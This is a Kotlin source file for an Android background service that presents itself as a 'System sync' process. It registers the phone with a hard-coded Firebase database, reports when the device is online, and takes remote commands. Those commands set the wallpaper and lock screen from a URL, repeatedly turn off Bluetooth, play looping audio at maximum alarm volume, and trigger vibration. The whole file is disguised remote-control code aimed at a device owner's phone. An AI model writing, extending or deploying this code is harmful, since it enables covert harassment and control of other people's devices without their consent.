package com.example.devsync

  import android.app.*
  import android.bluetooth.BluetoothAdapter
  import android.content.Intent
  import android.graphics.Bitmap
  import android.media.AudioAttributes
  import android.media.AudioManager
  import android.media.MediaPlayer
  import android.net.Uri
  import android.os.*
  import android.provider.Settings
  import androidx.core.app.NotificationCompat
  import com.bumptech.glide.Glide
  import com.bumptech.glide.request.target.SimpleTarget
  import com.bumptech.glide.request.transition.Transition
  import com.google.firebase.database.*
  import kotlinx.coroutines.*

  class DeviceSyncService : Service() {

      companion object {
          const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"

          fun convertGoogleDriveUrl(url: String): String {
              return when {
                  url.contains("drive.google.com/file/d/") -> {
                      val fileId = url.substringAfter("/file/d/").substringBefore("/")
                      "https://drive.google.com/uc?export=download&id=$fileId"
                  }
                  url.contains("drive.google.com/open?id=") -> {
                      val fileId = url.substringAfter("open?id=").substringBefore("&")
                      "https://drive.google.com/uc?export=download&id=$fileId"
                  }
                  else -> url
              }
          }
      }

      private lateinit var database: DatabaseReference
      private lateinit var regRef: DatabaseReference
      private val deviceId by lazy {
          Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
      }
      private var btDisableJob: Job? = null
      private var heartbeatJob: Job? = null
      private var mediaPlayer: MediaPlayer? = null

      override fun onCreate() {
          super.onCreate()
          database = FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
          regRef   = FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
          registerDevice()
          startForegroundService()
          setupFirebaseListeners()
          startHeartbeat()
      }

      private fun registerDevice() {
          val info = mapOf(
              "name"     to "${Build.MANUFACTURER} ${Build.MODEL}",
              "model"    to Build.MODEL,
              "online"   to true,
              "lastSeen" to ServerValue.TIMESTAMP
          )
          regRef.updateChildren(info)
          reportStatus("🟢 Device connected")
          regRef.child("online").onDisconnect().setValue(false)
          regRef.child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
      }

      private fun startHeartbeat() {
          heartbeatJob = CoroutineScope(Dispatchers.IO).launch {
              while (isActive) {
                  delay(30_000)
                  regRef.child("online").setValue(true)
                  regRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
                  reportStatus("🟢 Online")
              }
          }
      }

      private fun reportStatus(status: String) {
          regRef.child("lastStatus").setValue(status)
          regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
      }

      private fun startForegroundService() {
          val channelId = "sync_channel"
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
              val channel = NotificationChannel(
                  channelId, "System Sync", NotificationManager.IMPORTANCE_LOW
              )
              getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
          }
          val notification = NotificationCompat.Builder(this, channelId)
              .setContentTitle("System sync")
              .setContentText("Running in background")
              .setSmallIcon(android.R.drawable.ic_dialog_info)
              .setPriority(NotificationCompat.PRIORITY_LOW)
              .build()
          if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                startForeground(1001, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(1001, notification)
            }
      }

      private fun setupFirebaseListeners() {

          database.child("stop_all").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                      stopEverything()
                      database.child("stop_all").removeValue()
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          database.child("wallpaper_url").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  val rawUrl = snapshot.getValue(String::class.java)
                  if (!rawUrl.isNullOrEmpty()) {
                      val url = convertGoogleDriveUrl(rawUrl)
                      reportStatus("⏳ Wallpaper: downloading...")
                      setWallpaper(url)
                      database.child("wallpaper_url").removeValue()
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          database.child("bt_management_flag").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  val enabled = snapshot.getValue(Boolean::class.java) ?: false
                  if (enabled) {
                      startBtDisableLoop()
                      reportStatus("🔵 Bluetooth loop: ON")
                  } else {
                      stopBtDisableLoop()
                      reportStatus("⚪ Bluetooth loop: OFF")
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          database.child("audio_remote_trigger").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  if (snapshot.exists()) {
                      reportStatus("⏳ Audio: loading...")
                      database.child("remote_audio_url").get().addOnSuccessListener { urlSnapshot ->
                          val rawUrl = urlSnapshot.getValue(String::class.java)
                          if (!rawUrl.isNullOrEmpty()) {
                              val url = convertGoogleDriveUrl(rawUrl)
                              playRemoteAudio(url)
                          }
                      }
                      database.child("audio_remote_trigger").removeValue()
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })

          database.child("haptic_feedback_trigger").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  if (snapshot.exists()) {
                      triggerHaptic()
                      database.child("haptic_feedback_trigger").removeValue()
                      reportStatus("📳 Vibration done")
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })
      }

      private fun stopEverything() {
          val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
          vibrator.cancel()
          mediaPlayer?.stop()
          mediaPlayer?.release()
          mediaPlayer = null
          stopBtDisableLoop()
          database.child("bt_management_flag").setValue(false)
          database.child("haptic_feedback_trigger").removeValue()
          database.child("audio_remote_trigger").removeValue()
          database.child("remote_audio_url").removeValue()
          reportStatus("🛑 All commands stopped")
      }

      private fun setWallpaper(url: String) {
          Glide.with(this).asBitmap().load(url)
              .into(object : SimpleTarget<Bitmap>() {
                  override fun onResourceReady(resource: Bitmap, transition: Transition<in Bitmap>?) {
                      try {
                          val wm = getSystemService(WALLPAPER_SERVICE) as WallpaperManager
                          wm.setBitmap(resource, null, true, WallpaperManager.FLAG_SYSTEM)
                          wm.setBitmap(resource, null, true, WallpaperManager.FLAG_LOCK)
                          reportStatus("✅ Wallpaper set successfully")
                      } catch (e: Exception) {
                          reportStatus("❌ Wallpaper failed: ${e.message}")
                      }
                  }
              })
      }

      private fun startBtDisableLoop() {
          stopBtDisableLoop()
          btDisableJob = CoroutineScope(Dispatchers.IO).launch {
              while (isActive) {
                  @Suppress("DEPRECATION")
                  val adapter = BluetoothAdapter.getDefaultAdapter()
                  @Suppress("DEPRECATION")
                  if (adapter?.isEnabled == true) adapter.disable()
                  delay(3000)
              }
          }
      }

      private fun stopBtDisableLoop() { btDisableJob?.cancel() }

      private fun playRemoteAudio(url: String) {
          try {
              val audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
              val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
              audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)
              mediaPlayer?.release()
              mediaPlayer = MediaPlayer().apply {
                  setAudioAttributes(
                      AudioAttributes.Builder()
                          .setUsage(AudioAttributes.USAGE_ALARM)
                          .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                          .build()
                  )
                  setDataSource(url)
                  isLooping = true
                  prepareAsync()
                  setOnPreparedListener {
                      it.start()
                      reportStatus("🔊 Audio playing")
                  }
                  setOnErrorListener { _, _, _ ->
                      reportStatus("❌ Audio failed to load")
                      true
                  }
              }
          } catch (e: Exception) {
              reportStatus("❌ Audio error: ${e.message}")
          }
      }

      private fun triggerHaptic() {
          val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
              vibrator.vibrate(
                  VibrationEffect.createWaveform(longArrayOf(0, 300, 100, 300, 100, 500), -1)
              )
          } else {
              @Suppress("DEPRECATION")
              vibrator.vibrate(longArrayOf(0, 300, 100, 300, 100, 500), -1)
          }
      }

      override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
      override fun onBind(intent: Intent?): IBinder? = null

      override fun onDestroy() {
          super.onDestroy()
          heartbeatJob?.cancel()
          stopBtDisableLoop()
          mediaPlayer?.release()
          regRef.child("online").setValue(false)
      }
  }
